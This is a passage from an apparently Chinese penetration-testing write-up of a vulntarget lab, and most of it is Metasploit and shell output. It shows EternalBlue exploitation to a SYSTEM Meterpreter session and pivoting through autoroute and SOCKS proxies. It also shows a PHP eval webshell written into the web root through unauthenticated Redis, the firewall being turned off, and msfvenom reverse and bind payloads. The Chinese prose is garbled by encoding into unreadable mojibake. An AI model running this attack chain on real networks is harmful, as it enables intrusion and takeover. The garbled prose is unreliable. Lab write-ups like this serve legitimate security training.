arch indicated by DCE&#x2F;RPC reply</span><br><span class="line">[*] 10.10.10.248:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.10.248:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.10.248:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.10.248:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.10.248:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.10.248:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.10.248:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.10.248:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.10.248:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.10.248:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.10.248:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.10.10.248</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.10.114:4444 -&gt; 10.10.10.248:50270) at 2022-03-22 02:50:35 -0400</span><br><span class="line">[+] 10.10.10.248:445 - &#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">[+] 10.10.10.248:445 - &#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-WIN-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">[+] 10.10.10.248:445 - &#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN7-PC</span><br><span class="line">OS              : Windows 7 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64&#x2F;windows</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : Intel(R) PRO&#x2F;1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:f6:6a:05</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.10.10.248</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::2de1:362a:d91a:ed60</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 13</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : Intel(R) PRO&#x2F;1000 MT Network Connection #2</span><br><span class="line">Hardware MAC : 00:0c:29:f6:6a:0f</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.0.20.98</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::5146:76d1:7288:d8be</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 17</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : Microsoft ISATAP Adapter #3</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 25</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : Microsoft ISATAP Adapter #4</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:a0a:af8</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    10.0.20.255      ff:ff:ff:ff:ff:ff  13</span><br><span class="line">    10.10.10.1       fc:7c:02:73:a5:40  11</span><br><span class="line">    10.10.10.114     34:e1:2d:a3:ac:4b  11</span><br><span class="line">    10.10.10.255     ff:ff:ff:ff:ff:ff  11</span><br><span class="line">    224.0.0.2        00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.2        01:00:5e:00:00:02  11</span><br><span class="line">    224.0.0.2        01:00:5e:00:00:02  13</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  11</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  13</span><br><span class="line">    224.0.0.252      00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  11</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  13</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  11</span><br><span class="line">    255.255.255.255  ff:ff:ff:ff:ff:ff  11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°å­˜åœ¨ä¸¤ä¸ªç½‘å¡ å¦ä¸€ä¸ªç½‘æ®µä¸º <code>10.0.20.0/24</code></p>
<p>ç„¶åå»è¿ç§»è¿›ç¨‹ æ·»åŠ è·¯ç”±</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;manage&#x2F;migrate </span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (missing Meterpreter features: stdapi_sys_process_set_term_size)</span><br><span class="line">[*] Running module against WIN7-PC</span><br><span class="line">[*] Current server process: spoolsv.exe (1140)</span><br><span class="line">[*] Spawning notepad.exe process to migrate into</span><br><span class="line">[*] Spoofing PPID 0</span><br><span class="line">[*] Migrating into 3200</span><br><span class="line">[+] Successfully migrated into process 3200</span><br><span class="line">meterpreter &gt; run post&#x2F;multi&#x2F;manage&#x2F;autoroute </span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: windows)</span><br><span class="line">[*] Running module against WIN7-PC</span><br><span class="line">[*] Searching for subnets to autoroute.</span><br><span class="line">[+] Route added to subnet 10.0.20.0&#x2F;255.255.255.0 from host&#39;s routing table.</span><br><span class="line">[+] Route added to subnet 10.10.10.0&#x2F;255.255.255.0 from host&#39;s routing table.</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>route print</code> æŸ¥çœ‹è·¯ç”±</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; route print</span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   10.0.20.0          255.255.255.0      Session 2</span><br><span class="line">   10.10.10.0         255.255.255.0      Session 2</span><br><span class="line"></span><br><span class="line">[*] There are currently no IPv6 routes defined.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åä½¿ç”¨msf ç«¯å£æ‰«ææ¨¡å—</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">msf6 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set ports 22,23,80,443,8000,8080,8081,3389,143,445,6379,7001,7002,1433</span><br><span class="line">ports &#x3D;&gt; 22,23,80,443,8000,8080,8081,3389,143,445,6379,7001,7002,1433</span><br><span class="line">msf6 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set rhosts 10.0.20.0&#x2F;24</span><br><span class="line">rhosts &#x3D;&gt; 10.0.20.0&#x2F;24</span><br><span class="line">msf6 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set threads 20</span><br><span class="line">threads &#x3D;&gt; 20</span><br><span class="line">msf6 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 10.0.20.1:            - 10.0.20.1:445 - TCP OPEN</span><br><span class="line">[+] 10.0.20.1:            - 10.0.20.1:3389 - TCP OPEN</span><br><span class="line"></span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned  26 of 256 hosts (10% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned  56 of 256 hosts (21% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned  79 of 256 hosts (30% complete)</span><br><span class="line">[+] 10.0.20.98:           - 10.0.20.98:80 - TCP OPEN</span><br><span class="line">[+] 10.0.20.98:           - 10.0.20.98:445 - TCP OPEN</span><br><span class="line">[+] 10.0.20.99:           - 10.0.20.99:80 - TCP OPEN</span><br><span class="line">[+] 10.0.20.99:           - 10.0.20.99:6379 - TCP OPEN</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 103 of 256 hosts (40% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 129 of 256 hosts (50% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 158 of 256 hosts (61% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 180 of 256 hosts (70% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 207 of 256 hosts (80% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 233 of 256 hosts (91% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰«åˆ°ä¸¤å°æœºå™¨  98æ˜¯æ‹¿åˆ°çš„å¤–ç½‘win7  99æ˜¯è¿™ä¸ªç½‘æ®µçš„å¦ä¸€å°æœºå™¨</p>
<br>

<p>è¿™é‡Œè®¾ç½®ä¸ªä»£ç†(ä¹‹å‰æˆ‘éƒ½æ˜¯æ‰‹åŠ¨å»é…è·¯ç”± æ²¡ç”¨è¿‡è¿™ä¸ªåœ¨msf sessionä¸­è‡ªåŠ¨é…çš„  ç„¶åå°±æ‰‹åŠ¨å»é…çš„ ç»“æœéƒ½æ˜¯å¯åŠ¨å°±ç»“æŸ ç„¶åæˆ‘è‡ªå·±å†å»proxychain è¿127.0.0.1:1080å‘ç°è‡ªåŠ¨è·¯ç”±é‚£é‡Œå·²ç»ç»™é…ç½®å¥½äº†â€¦) </p>
<br>

<h3 id="æ¨ªå‘ç¬¬äºŒå°æœºå™¨"><a href="#æ¨ªå‘ç¬¬äºŒå°æœºå™¨" class="headerlink" title="æ¨ªå‘ç¬¬äºŒå°æœºå™¨"></a>æ¨ªå‘ç¬¬äºŒå°æœºå™¨</h3><p>99è¿™å°æœºå™¨å¼€æ”¾äº†80ç«¯å£å’Œ6379ç«¯å£ å¯æµ‹è¯•ä¸‹æ˜¯å¦å­˜åœ¨redisæœªæˆæƒ</p>
<p>å…ˆç”¨dirb å»æ‰«ä¸€ä¸‹80ç«¯å£çš„ç›®å½• dirbå¤ªæ…¢äº† æ²¡æ‰“æ‰«åˆ°å•¥æ¢dirsearch </p>
<p><code>proxychain python3 dirsearch.py -u http://10.0.20.99</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">403   225B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;Trace.axd::$DATA</span><br><span class="line">200    11B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;index.php</span><br><span class="line">200    11B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;index.pHp</span><br><span class="line">200    11B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;index.php.</span><br><span class="line">200    11B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;index.php&#x2F;login&#x2F;</span><br><span class="line">403   225B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;index.php::$DATA</span><br><span class="line">200    14KB  http:&#x2F;&#x2F;10.0.20.99:80&#x2F;l.php</span><br><span class="line">200    70KB  http:&#x2F;&#x2F;10.0.20.99:80&#x2F;phpinfo.php</span><br><span class="line">403   226B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;web.config::$DATA</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åªæœ‰l.php å’Œ phpinfoæœ‰ç‚¹ä¿¡æ¯ l.phpæ˜¯ä¸€ä¸ªæ¢é’ˆ</p>
<p><img src="/posts/3edb83f3/6.png" alt="æˆªå›¾"></p>
<p><img src="/posts/3edb83f3/7.png" alt="æˆªå›¾"></p>
<p>é€šè¿‡æ¢é’ˆå¯ç”¨å‘ç°æ˜¯ä½¿ç”¨phpstudyæ­å»ºçš„ï¼Œç»å¯¹è·¯å¾„ä¸º<code> C:/phpStudy/PHPTutorial/WWW</code> </p>
<h5 id="CSå»ºç«‹socks4ä»£ç†"><a href="#CSå»ºç«‹socks4ä»£ç†" class="headerlink" title="CSå»ºç«‹socks4ä»£ç†"></a>CSå»ºç«‹socks4ä»£ç†</h5><p>è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨csçš„ä»£ç†å»è®¿é—®webæœåŠ¡</p>
<p>å³é”®æ‹¿åˆ°æƒé™çš„ä¸»æœº â€”&gt; Pivoting â€”&gt; Socks Server</p>
<p>ç„¶åä¼šç”Ÿæˆä¸€ä¸ªéšæœºæœªå ç”¨çš„ç«¯å£ï¼Œç‚¹å‡»å¯åŠ¨å³å¯</p>
<p><img src="/posts/3edb83f3/8.png" alt="æˆªå›¾"></p>
<p>ç„¶åä½¿ç”¨ä»£ç† è¿æ¥ socks4 CSip å’Œè¿™ä¸ªç«¯å£å³å¯</p>
<p>ï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨å‰é¢msfèµ·çš„ä»£ç†ï¼‰</p>
<br>

<h4 id="Redisæœªæˆæƒgetshell"><a href="#Redisæœªæˆæƒgetshell" class="headerlink" title="Redisæœªæˆæƒgetshell"></a>Redisæœªæˆæƒgetshell</h4><p>æ²¡å•¥åˆ©ç”¨ç‚¹ï¼Œé‚£å°±å»è€ƒè™‘ 6379çš„redisäº†</p>
<p><code>proxychains redis-cli -h 10.0.20.99</code> å‘ç°æœªæˆæƒ</p>
<p>å¯ç›´æ¥å†™ä¸€ä¸ªwebshell ç„¶åå»è¿æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set webshell &quot;&lt;?php @eval($_REQUEST[&#39;ant&#39;]);?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; </span><br></pre></td></tr></table></figure>

<p>èƒ½å†™å…¥ä½†æ˜¯æ²¡æ³•è¿ä¸Šèšå‰‘â€¦ â€¦ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename info.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>å†™ä¸€ä¸ªphpinfoä¹Ÿæ²¡å•¥é—®é¢˜ é‚£åŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯èšå‰‘ä»£ç†çš„é—®é¢˜äº†</p>
<p><img src="/posts/3edb83f3/9.png" alt="æˆªå›¾"></p>
<br>

<p>ä½¿ç”¨èšå‰‘è‡ªèº«ä»£ç†æ²¡è¿ä¸Šï¼Œä½¿ç”¨socksCapä¹Ÿæ²¡è¿ä¸Šï¼Œä½¿ç”¨proxifierå°±æˆåŠŸè¿ä¸Šäº†â€¦.</p>
<p><img src="/posts/3edb83f3/10.png" alt="æˆªå›¾"></p>
<br>

<p><code>whomai </code> å¾—åˆ°ä¹Ÿæ˜¯systemæƒé™</p>
<p><code>systeminfo</code>  å¾—åˆ°åŸŸä¿¡æ¯å’Œä¸¤å¼ ç½‘å¡</p>
<p><img src="/posts/3edb83f3/11.png" alt="æˆªå›¾"></p>
<p>åŸŸåä¸º <code>vulntarget.com</code>  ä¸€å¼ ç½‘å¡ä¸º <code>10.0.20.0/24</code> å±äºdmzåŒºçš„ç½‘æ®µ</p>
<p>ç„¶å<code>10.0.10.0/24</code> åŸºæœ¬ä¸Šå¯ä»¥åˆ¤å®šä¸ºæ˜¯åŸŸç½‘æ®µ</p>
<p>ç„¶åæŸ¥ä¸€ä¸‹æ€è½¯ <code>tasklist -svc</code></p>
<p><img src="/posts/3edb83f3/12.png" alt="æˆªå›¾"></p>
<p>å­˜åœ¨WinDef</p>
<p>ç”Ÿæˆä¸€ä¸ªé©¬ å†è¿˜æ²¡è¢«æ€çš„æ—¶å€™ ä¹Ÿè¿ä¸ä¸Šï¼Œä¼°è®¡æ˜¯å¼€äº†é˜²ç«å¢™</p>
<p><code>netsh advfirewall show allprofiles</code> æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€</p>
<p><img src="/posts/3edb83f3/13.png" alt="æˆªå›¾"></p>
<p>ä¸€é¡¿ä¹±ç ï¼Œå…ˆå»æ”¹ä¸€ä¸‹ç¼–ç æ–¹å¼ æ”¹æˆgbkåå°±å¯ä»¥äº†</p>
<p><img src="/posts/3edb83f3/14.png" alt="æˆªå›¾"></p>
<br>

<p><code>netsh advfirewall set allprofiles state off</code> å…³é—­é˜²ç«å¢™(è¿™é‡Œæ˜¯systemæƒé™ ç›´æ¥å°±å¯å…³é—­)</p>
<p><img src="/posts/3edb83f3/15.png" alt="æˆªå›¾"></p>
<br>

<h4 id="CSç«¯å£è½¬å‘å°è¯•ä¸Šçº¿win2016"><a href="#CSç«¯å£è½¬å‘å°è¯•ä¸Šçº¿win2016" class="headerlink" title="CSç«¯å£è½¬å‘å°è¯•ä¸Šçº¿win2016"></a>CSç«¯å£è½¬å‘å°è¯•ä¸Šçº¿win2016</h4><p>ç„¶åå°è¯•ä½¿ç”¨ä¹‹å‰çš„å¤–ç½‘win7çš„cs beacon ä»£ç†è¿åˆ°win2016ä¸Š</p>
<p>ä½¿ç”¨ç«¯å£è½¬å‘ å³é”®win7beacon â€”&gt; pivoting â€”&gt; Listener â€¦ â€”&gt;</p>
<p><img src="/posts/3edb83f3/16.png" alt="æˆªå›¾"></p>
<p>ç„¶åä¿å­˜åä¼šåœ¨listenersä¸­ç”Ÿæˆè¿™ä¸ªé€šè¿‡win7åšä»£ç†çš„listner</p>
<p>ç„¶åå»ä¸Šé©¬ï¼Œä½†æ˜¯ä¸Šå»å°±ä¼šè¢«WinDefç»™æ€æ‰â€¦.. å¡ä½äº†æ˜‚</p>
<br>

<h4 id="msfä¸Šçº¿win2016"><a href="#msfä¸Šçº¿win2016" class="headerlink" title="msfä¸Šçº¿win2016"></a>msfä¸Šçº¿win2016</h4><h5 id="åå‘é©¬ä¸Šçº¿å¤±è´¥äº†"><a href="#åå‘é©¬ä¸Šçº¿å¤±è´¥äº†" class="headerlink" title="åå‘é©¬ä¸Šçº¿å¤±è´¥äº†"></a>åå‘é©¬ä¸Šçº¿å¤±è´¥äº†</h5><p>è¿™é‡Œipä¸ºwin7çš„å†…ç½‘IP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~&#x2F;Desktop]</span><br><span class="line">â””â”€$ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;10.0.20.98 lport&#x3D;4444 -f exe &gt; sl.exe   </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.20.98:5555 via the meterpreter on session 2</span><br><span class="line">                                       </span><br></pre></td></tr></table></figure>

<p>ç„¶åå¡ä½äº†</p>
<br>

<h5 id="ä½¿ç”¨æ­£å‘é©¬-æˆåŠŸä¸Šçº¿"><a href="#ä½¿ç”¨æ­£å‘é©¬-æˆåŠŸä¸Šçº¿" class="headerlink" title="ä½¿ç”¨æ­£å‘é©¬ æˆåŠŸä¸Šçº¿"></a>ä½¿ç”¨æ­£å‘é©¬ æˆåŠŸä¸Šçº¿</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~&#x2F;Desktop]</span><br><span class="line">â””â”€$ msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp lport&#x3D;6666 -f exe &gt; 6666.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 496 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set rhost 10.0.20.99</span><br><span class="line">rhost &#x3D;&gt; 10.0.20.99</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lport 6666</span><br><span class="line">lport &#x3D;&gt; 6666</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started bind TCP handler against 10.0.20.99:6666</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.0.20.99</span><br><span class="line">[*] Meterpreter session 3 opened (10.0.20.98:53533 -&gt; 10.0.20.99:6666) at 2022-03-22 05:46:01 -0400</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN2016</span><br><span class="line">OS              : Windows 2016+ (10.0 Build 14393).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : VULNTARGET</span><br><span class="line">Logged On Users : 4</span><br><span class="line">Meterpreter     : x64&#x2F;windows</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    10.0.10.110      00:0c:29:be:1e:f6  12</span><br><span class="line">    10.0.10.255      ff:ff:ff:ff:ff:ff  12</span><br><span class="line">    10.0.20.98       00:0c:29:f6:6a:0f  9</span><br><span class="line">    10.0.20.255      ff:ff:ff:ff:ff:ff  9</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  9</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  12</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  9</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  12</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  9</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å·²ç»å¾—åˆ°åŸŸå†…ipæ®µä¸º <code>10.0.10.0/24</code></p>
<p>ç„¶åå®šä½åŸŸæ§</p>
<p><code>run post/windows/gather/enum_domain</code></p>
<p>å¾—åˆ°åŸŸæ§ä¸ºDCå <code>win2019</code>  IP<code>10.0.10.110</code> åŸŸå <code>vulntarget</code></p>
<p><img src="/posts/3edb83f3/17.png" alt="æˆªå›¾"></p>
<br>

<p>å†æ·»åŠ ä¸€ä¸ªwin2016çš„è·¯ç”±</p>
<p><code>meterpreter &gt; run post/multi/manage/autoroute </code></p>
<p><img src="/posts/3edb83f3/18.png" alt="æˆªå›¾"></p>
<br>

<h3 id="åŸŸæ§win2016"><a href="#åŸŸæ§win2016" class="headerlink" title="åŸŸæ§win2016"></a>åŸŸæ§win2016</h3><h4 id="ç«¯å£æ‰«æ-1"><a href="#ç«¯å£æ‰«æ-1" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p>è¿™é‡Œä¸ºäº†èŠ‚çœæ—¶é—´å°±æ‰«å‡ ä¸ªç«¯å£äº† ä¸ç„¶å¤ªæ…¢äº†</p>
